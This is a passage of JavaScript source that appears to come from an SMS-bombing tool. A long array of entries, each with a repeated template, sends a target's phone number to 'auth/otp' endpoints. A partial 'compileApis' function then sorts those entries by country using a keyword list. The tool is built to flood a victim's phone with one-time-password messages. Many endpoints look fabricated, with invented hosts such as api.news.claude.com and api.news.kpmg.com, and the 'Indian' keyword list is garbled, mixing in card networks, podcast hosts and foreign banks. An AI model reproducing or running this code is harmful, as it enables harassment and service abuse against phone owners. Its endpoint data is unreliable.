        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Flipboard_News_App_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.flipboardapp.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'SmartNews_News_App_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.smartnewsapp.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Opera_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.opera.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Brave_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.brave.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Vivaldi_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.vivaldi.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Firefox_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.firefox.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Chrome_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.chrome.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Edge_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.edge.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Safari_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.safari.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'DuckDuckGo_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.duckduckgo.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Ecosia_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.ecosia.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Qwant_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.qwant.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Startpage_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.startpage.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Search_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.search.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Yandex_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.yandex.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Bing_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.bing.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Yahoo_News_Search_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.yahoosearch.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Ask_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.ask.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'AOL_News_Search_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.aolsearch.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Wolfram_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.wolfram.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Perplexity_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.perplexity.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Claude_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.claude.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Gemini_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.gemini.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'ChatGPT_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.chatgpt.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'DeepSeek_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.deepseek.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Copilot_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.copilot.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Grammarly_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.grammarly.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Hemingway_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.hemingway.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'ProWritingAid_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.prowritingaid.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Quillbot_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.quillbot.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Jasper_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.jasper.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Copy.ai_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.copy.ai/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Writesonic_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.writesonic.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Rytr_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.rytr.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Anyword_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.anyword.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Peppertype_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.peppertype.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Frase_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.frase.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'SurferSEO_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.surferseo.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'MarketMuse_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.marketmuse.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Clearscope_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.clearscope.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'SEMrush_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.semrush.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Ahrefs_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.ahrefs.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Moz_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.moz.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'SpyFu_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.spyfu.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'SimilarWeb_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.similarweb.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Alexa_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.alexa.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Compete_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.compete.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Quantcast_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.quantcast.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Comscore_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.comscore.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Nielsen_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.nielsen.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'IRI_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.iri.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'NPD_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.npd.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Gartner_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.gartner.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Forrester_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.forrester.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'IDC_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.idc.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Accenture_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.accenture.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Deloitte_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.deloitte.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'PwC_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.pwc.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'EY_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.ey.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'KPMG_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.kpmg.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'McKinsey_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.mckinsey.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'BCG_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.bcg.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Bain_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.bain.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'OliverWyman_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.oliverwyman.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'LEK_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.lek.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Kearney_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.kearney.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Strategy&_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.strategyand.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'RolandBerger_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.rolandberger.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'ArthurDLittle_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.adlittle.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'AlixPartners_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.alixpartners.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'FTI_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.fti.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Navigant_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.navigant.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'PA_Consulting_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.paconsulting.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'BearingPoint_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.bearingpoint.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Capgemini_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.capgemini.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Atos_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.atos.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Cognizant_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.cognizant.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Infosys_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.infosys.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'TCS_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.tcs.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Wipro_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.wipro.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'HCL_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.hcl.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Tech_Mahindra_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.techmahindra.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'LTI_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.lti.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Mphasis_News_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.news.mphasis.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    }
];

// ============================================================
// COMPILER: Translates Python lambdas to Node.js functions
// ============================================================
function compileApis(rawList) {
    const bd = [], ind = [];
    const seen = new Set();

    const INDIAN_HINTS = [
        'meesho', 'flipkart', 'myntra', 'ajio', 'nykaa', 'bigbasket', 'zepto',
        'blinkit', 'instamart', 'dmart', 'newme', 'wakefit', 'zivame', 'lenskart',
        'swiggy', 'zomato', 'uber', 'olacabs', 'rapido', 'goibibo', 'makemytrip',
        'oyorooms', 'paytm', 'phonepe', 'cred', 'jupiter', 'khatabook', 'tatacapital',
        'pharmeasy', '1mg', 'doubtnut', 'shiprocket', 'gokwik', 'amazon.in',
        'pokerbaazi', 'lenskart', 'juno', 'apollo', 'netmeds', 'medlife', 'practo',
        'cult.fit', 'healthifyme', 'policybazaar', 'acko', 'hdfc', 'icici', 'sbi',
        'axis', 'kotak', 'yesbank', 'indusind', 'rbl', 'pnb', 'bob', 'canara',
        'unionbank', 'idfc', 'federal', 'dbs', 'hsbc', 'citibank', 'paypal',
        'stripe', 'razorpay', 'cashfree', 'payu', 'billdesk', 'ccavenue',
        'instamojo', 'upi', 'bhim', 'npci', 'rupay', 'visa', 'mastercard',
        'amex', 'discover', 'diners', 'aws', 'azure', 'oracle', 'ibm', 'sap',
        'salesforce', 'hubspot', 'zoho', 'freshworks', 'servicenow', 'atlassian',
        'slack', 'zoom', 'teams', 'meet', 'webex', 'adobe', 'figma', 'canva',
        'sketch', 'invision', 'marvel', 'proto', 'uxpin', 'balsamiq', 'axure',
        'mockflow', 'wireframe', 'mockplus', 'justinmind', 'pidoco', 'hotgloo',
        'fluidui', 'framer', 'origami', 'principle', 'keynote', 'powerpoint',
        'slides', 'prezi', 'slideshare', 'haikudeck', 'emaze', 'sway', 'visme',
        'beautiful', 'gamma', 'tome', 'pitch', 'zight', 'loom', 'screenrec',
        'obs', 'streamlabs', 'restream', 'streamelements', 'nightbot', 'mobcrush',
        'bigo', 'mico', 'azar', 'hago', 'yalla', 'chamet', 'lemo', 'tumile',
        'meelive', 'starmaker', 'smule', 'triller', 'likee', 'kuaishou', 'douyin',
        'helo', 'zili', 'vigo', 'uplive', '17live', 'pococha', 'bambuser',
        'streamyard', 'riverside', 'squadcast', 'zencastr', 'anchor', 'simplecast',
        'podbean', 'transistor', 'castos', 'redcircle', 'acast', 'megaphone',
        'art19', 'libsyn', 'blubrry', 'mixcloud', 'hearthis', 'audiomack',
        'bandcamp', 'soundtrap', 'bandlab', 'vevo', 'mtv', 'vh1', 'comedycentral',
        'nickelodeon', 'cartoonnetwork', 'pogo', 'discovery', 'natgeo', 'bbc',
        'cnn', 'foxnews', 'msnbc', 'abcnews', 'cbsnews', 'nbcnews', 'reuters',
        'bloomberg', 'ft.com', 'wsj', 'nytimes', 'washingtonpost', 'guardian',
        'telegraph', 'timesofindia', 'hindustantimes', 'indianexpress', 'thehindu',
        'deccanherald', 'businessstandard', 'financialexpress', 'mint', 'economictimes',
        'ndtv', 'abpnews', 'zeenews', 'indiatoday', 'outlookindia', 'frontline',
        'caravan', 'scroll', 'thewire', 'theprint', 'news18', 'tv9', 'republictv',
        'timesnow', 'cnnnews18', 'indiatv', 'aajtak', 'zeebusiness', 'etnow',
        'bloombergquint', 'moneycontrol', 'investopedia', 'tradingview', 'zerodha',
        'upstox', 'groww', 'angelone', '5paisa', 'motilaloswal', 'icicidirect',
        'hdfcsec', 'kotaksec', 'sharekhan', 'edelweiss', 'sbisec', 'axisdirect',
        'iifl', 'reliancesecurities', 'indiabullssec', 'geojit', 'idfcfirstsec',
        'yessecurities', 'federalbanksec', 'dbstreasuries', 'hsbcsec', 'citibanksec',
        'sc.com', 'deutschebank', 'barclays', 'ubs', 'creditsuisse', 'morganstanley',
